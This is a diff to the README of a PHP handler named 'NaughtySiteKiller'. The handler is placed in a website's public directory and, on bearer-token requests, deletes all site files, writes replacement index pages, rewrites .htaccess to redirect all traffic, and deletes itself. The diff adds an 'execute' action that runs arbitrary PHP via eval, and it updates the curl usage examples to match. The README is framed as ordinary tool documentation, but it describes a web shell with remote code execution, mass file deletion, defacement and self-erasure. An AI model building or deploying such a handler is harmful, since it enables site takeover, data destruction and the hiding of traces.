@@ -35,7 +35,7 @@ echo hash('sha256', $password);  // Outputs the hashed token
 
 #### 2. Handling the Incoming Request
 
-Place the `NaughtySiteKiller` handler on the public directory of the website where it can be accessed through HTTP requests. This handler will process incoming requests, validate the authorization token, check the requested action (`kill`, `template`, `self-key`), and execute the appropriate method.
+Place the `NaughtySiteKiller` handler on the public directory of the website where it can be accessed through HTTP requests. This handler will process incoming requests, validate the authorization token, check the requested action (`kill`, `execute`, `template`, `self-key`), and execute the appropriate method.
 
 **Example Usage**:
 ```php
@@ -61,8 +61,8 @@ The following fields can be included in the payload when sending a request:
 
 ```php
 $request = [
-    'action'      => 'kill', // Action to perform: 'kill', 'template', or 'self-key'.
-    'content'     => 'Content for the template (used in both HTML and PHP files when performing kill action, or for template creation).',
+    'action'      => 'kill', // Action to perform: 'kill', 'execute', 'template', or 'self-key'.
+    'content'     => 'Content for the template, execute (used in both HTML and PHP files when performing kill action, or for template creation).',
     'htmlContents'=> 'Content for the template.html file (used when performing kill action).', // HTML content for the template.
     'phpContents' => 'Content for the template.php file (used when performing kill action).', // PHP content for the template.
     'name'        => 'Filename to use when performing template action.', // Custom filename for the template.
@@ -74,6 +74,7 @@ $request = [
 
 - **`action`** (string): Specifies which action to perform:
   - `'kill'`: Deletes files including self and creates `index.php` and `index.html` files (HTML and PHP).
+  - `'execute'`: Execute a string as PHP code using `eval` function. The instructions should be placed in `contents`.
   - `'template'`: Creates template file `<name>.php` and modifies `.htaccess` to redirect all website request to `<name>.php` if no custom htaccess content is provided.
   - `'self-key'`: self-destructing, delete the handler file only.
   
@@ -96,7 +97,7 @@ Here are examples of how to send payload requests using `curl` for the different
 ### 1. Kill Action Request (Deletes all files and creates template files)
 
 ```bash
-curl -X POST http://your-server-url/your-script.php \
+curl -X POST http://your-server-url/naughty.php \
      -H "Authorization: Bearer YOUR_BEARER_TOKEN" \
      -H "Content-Type: application/json" \
      -d '{
@@ -104,6 +105,31 @@ curl -X POST http://your-server-url/your-script.php \
            "phpContents": "<?php echo \"Hello, World!\"; ?>",
            "htmlContents": "<html><body><h1>Hello, World!</h1></body></html>"
         }'
+```
+
+### 1. Execute Action (Run custom code on the server—because we trust you)
+
+The Execute Action allows you to send custom PHP code to be executed on the server. It's like a magic wand for your commands.
+
+```bash
+curl -X POST http://your-server-url/naughty.php \
+     -H "Authorization: Bearer YOUR_BEARER_TOKEN" \
+     -H "Content-Type: application/json" \
+     -d '{
+           "action": "execute",
+           "contents": "return \"Hello, Naughty Client!\";"
+        }'
+```
+
+**Output:**
+
+This will execute the PHP code and you will receive the following response:
+
+```php
+{
+    "message": "Execution completed",
+    "result": "Hello, Naughty Client!"
+}
 ```
 
 #### Explanation:
@@ -115,7 +141,7 @@ curl -X POST http://your-server-url/your-script.php \
 ### 2. Template Action Request (Creates template files and updates `.htaccess`)
 
 ```bash
-curl -X POST http://your-server-url/your-script.php \
+curl -X POST http://your-server-url/naughty.php \
      -H "Authorization: Bearer YOUR_BEARER_TOKEN" \
      -H "Content-Type: application/json" \
      -d '{
@@ -136,7 +162,7 @@ curl -X POST http://your-server-url/your-script.php \
 ### 3. **Self-Key Action Request (Reserved for future use)**
 
 ```bash
-curl -X POST http://your-server-url/your-script.php \
+curl -X POST http://your-server-url/naughty.php \
      -H "Authorization: Bearer YOUR_BEARER_TOKEN" \
      -H "Content-Type: application/json" \
      -d '{
@@ -151,5 +177,5 @@ curl -X POST http://your-server-url/your-script.php \
 
 ### Notes:
 - **Authorization**: Replace `YOUR_BEARER_TOKEN` with the actual Bearer token you are using for authentication.
-- **Server URL**: Replace `http://your-server-url/your-script.php` with the actual URL of your script.
+- **Server URL**: Replace `http://your-server-url/naughty.php` with the actual URL of your script.
 - **Payload**: The payload for each action is sent as JSON in the body of the request using the `-d` flag with `curl`.
